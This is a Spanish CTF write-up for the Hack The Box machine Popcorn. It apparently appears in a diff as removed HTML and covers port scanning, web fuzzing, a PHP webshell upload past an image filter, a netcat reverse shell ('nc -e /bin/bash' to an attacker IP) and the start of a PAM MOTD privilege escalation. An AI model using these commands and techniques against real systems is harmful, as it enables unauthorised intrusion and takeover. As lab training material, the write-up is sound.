-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección 10.10.10.6.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.6
-PING 10.10.10.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.6: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;138 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.6 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 137.631/137.631/137.631/0.000 ms|
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.6 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-16 15:55 CST
-Initiating Ping Scan at 15:55
-Scanning 10.10.10.6 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
-Completed Ping Scan at 15:55, 0.17s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating SYN Stealth Scan at 15:55
-Scanning 10.10.10.6 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 22/tcp on 10.10.10.6
-Discovered open port 80/tcp on 10.10.10.6
-SYN Stealth Scan Timing: About 42.42% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 15:56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:42 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Completed SYN Stealth Scan at 15:56, 64.11s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.6
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.22s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;64.40 seconds
-           Raw packets sent: 66039 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.906MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 66036 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.641MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.6
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.10.6 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-16 15:58 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.6
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp open  http    Apache httpd 2.2.12 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
-|_http-server-header: Apache/2.2.12 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 11.84 seconds
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como vemos el puerto 80 abierto, vamos a ver a lo que nos enfrentamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.6/
-http://10.10.10.6/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.2.12], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.6]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que se trata de la página default de Apache, que es lo que vemos vía web.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-popcorn/popcorn-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;No vemos nada interesante, asi que vamos a buscar recursos dentro del servidor web y vamos a empezar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; antes de tirar de otra herramienta tocha.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-enum &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.6
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-16 16:02 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.6
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT   STATE SERVICE
-80/tcp open  http
-| http-enum: 
-|   /test/: Test page
-|   /test.php: Test page
-|   /test/logon.html: Jetty
-|_  /icons/: Potentially interesting folder w/ directory listing
-
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;37.37 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vamos a echarles un ojo:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-popcorn/popcorn-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-popcorn/popcorn-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Algo que podemos observar son los &lt;strong&gt;HTTP Headers Information&lt;/strong&gt; y en específico el &lt;strong&gt;User-Agent&lt;/strong&gt; que nos aparece los datos de nuestro navegador &lt;strong&gt;Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-popcorn/popcorn-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vamos a tratar de cambiarlo mediante el uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.6/test/&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;
-&amp;lt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;td &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;e&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;User-Agent &amp;lt;/td&amp;gt;&amp;lt;td &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;v&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;curl/7.74.0 &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
-❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.6/test/&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: k4miyo&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;
-&amp;lt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;td &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;e&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;User-Agent &amp;lt;/td&amp;gt;&amp;lt;td &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;v&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;k4miyo &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora debemos buscar una forma de ejecutar comandos a nivel de sistema aprovechando el campo &lt;strong&gt;User-Agent&lt;/strong&gt;; sin embargo, no obtenemos nada. Por lo tanto, vamos a hacer uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; para obtener recursos dentro del servidor web:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 300 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;177 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.6/FUZZ
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://10.10.10.6/FUZZ
-Total requests: 220560
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                         
-=====================================================================
-
-000000611:   200        656 L    3119 W     47507 Ch    &quot;test&quot;                                                          
-000004023:   200        293 L    882 W      11356 Ch    &quot;torrent&quot;                                                       
-000006953:   404        9 L      32 W       278 Ch      &quot;1095&quot;                                                          
-
-Total time: 44.90012
-Processed Requests: 6722
-Filtered Requests: 6720
-Requests/sec.: 149.7100
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/torrent/&lt;/code&gt;, así que vamos a echarle un ojo.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-popcorn/popcorn-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si analizamos un poco el sitio, vemos que tenemos la capacidad de registrarnos, así que eso haremos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-popcorn/popcorn-web5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-popcorn/popcorn-web6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si ponemos ojo de lince, tenemos la capacidad de subir archivos y por el nombre del recurso, lo más seguro es que sea un torrent; asi que vamos a descargar un archivo el que queramos; para este caso sería de &lt;a href=&quot;https://www.parrotsec.org/security-edition/&quot;&gt;Parrot OS&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-popcorn/popcorn-web7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-popcorn/popcorn-web8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si nos percatamos, en la parte de abajo, vemos que tenemos la posiblidad de subir una imagen; pero si en vez de una imagen subimos un archivo php, nos indica &lt;strong&gt;Invalid file&lt;/strong&gt;. Por lo tanto, vamos a tratar de subir una imagen de verdad y vamos a hacer uso de &lt;strong&gt;BurpSuite&lt;/strong&gt; en donde modificamos el contenido del archivo a nuestra sentencia php de siempre y también modificamos el nombre del archivo a **shell.php.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-popcorn/popcorn-burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que se ha subido de forma exitosa; asi que vamos a ver en donde podría estar el archivo que subimos. Si hacemos &lt;em&gt;hovering&lt;/em&gt; sobre la imagen que subimos (para este caso nos aparece &lt;strong&gt;Image File Not Found!&lt;/strong&gt;), vemos que nos aparece la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upload&lt;/code&gt; y despúes un nombre random con terminación php, ese es nuestro archivo, así que vamos a abrirlo en una segunda ventana para ejecutar comandos a nivel de sistema.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-popcorn/popcorn-web9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-popcorn/popcorn-web10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora como siempre, nos ponemos en escucha por el puerto 443 y procedemos a entablarnos una reverse shell.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.6/torrent/upload/8808ea0b7cf49a6fb69bcdb20aeac84a4fd9974f.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;nc 
- &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/bash 10.10.14.27 443 &amp;amp;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.6] 34180
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;www-data
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para trabajar más cómodos, vamos a hacer un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt;. Ya nos encontramos dentro de la máquina y podemos visuailzar la flag (user.txt). Ahora necesitamos enumerar un poco el sistema para encontrar un forma de escalar privilegios.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@popcorn:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-www-data@popcorn:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data: 
-www-data@popcorn:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;f
-./george/.bash_logout
-./george/.bashrc
-./george/torrenthoster.zip
-./george/.cache/motd.legal-displayed
-./george/.sudo_as_admin_successful
-./george/user.txt
-./george/.nano_history
-./george/.mysql_history
-./george/.profile
-www-data@popcorn:/home&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Aquí ya vemos algo que nos llama la atención, que es el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/george/.cache/motd.legal-displayed&lt;/code&gt;; que si buscamos un poco, vamos a encontrar un posible exploit a utilizar.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit motd
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
- Exploit Title                                                                                 |  Path
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-Linux PAM 1.1.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 9.10/10.04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - MOTD File Tampering Privilege Escalation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             | linux/local/14273.sh
-Linux PAM 1.1.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 9.10/10.04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - MOTD File Tampering Privilege Escalation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             | linux/local/14339.sh
-MultiTheftAuto 0.5 patch 1 - Server Crash / MOTD Deletion                                      | windows/dos/1235.c
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-Shellcodes: No Results
-Papers: No Results
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nos indica que aplica para &lt;strong&gt;Linux PAM 1.1.0&lt;/strong&gt;, vamos a corroborarlo:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@popcorn:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;pam
-ii  libpam-modules                      1.1.0-2ubuntu1                    Pluggable Authentication Modules &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;PAM
-ii  libpam-runtime                      1.1.0-2ubuntu1                    Runtime support &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the PAM library
-ii  libpam0g                            1.1.0-2ubuntu1                    Pluggable Authentication Modules library
-ii  python-pam                          0.4.2-12ubuntu3                   A Python interface to the PAM library
-www-data@popcorn:/home&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que si podría aplicar, así que nos descargamos el exploit, lo copiamos en una ruta donde tengamos permisos y lo ejecutamos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; linux/local/14339.sh
-  Exploit: Linux PAM 1.1.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 9.10/10.04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - MOTD File Tampering Privilege Escalation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-      URL: https://www.exploit-db.com/exploits/14339
-     Path: /usr/share/exploitdb/exploits/linux/local/14339.sh
-File Type: Bourne-Again shell script, ASCII text executable
-
-Copied to: /home/k4miyo/Documentos/HTB/Popcorn/exploits/14339.sh
-
-
-❯ &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;14339.sh privesc_motd.sh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para evitar algún problema, vamos a pasarlo a formato Unix.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ dos2unix privesc_motd.sh
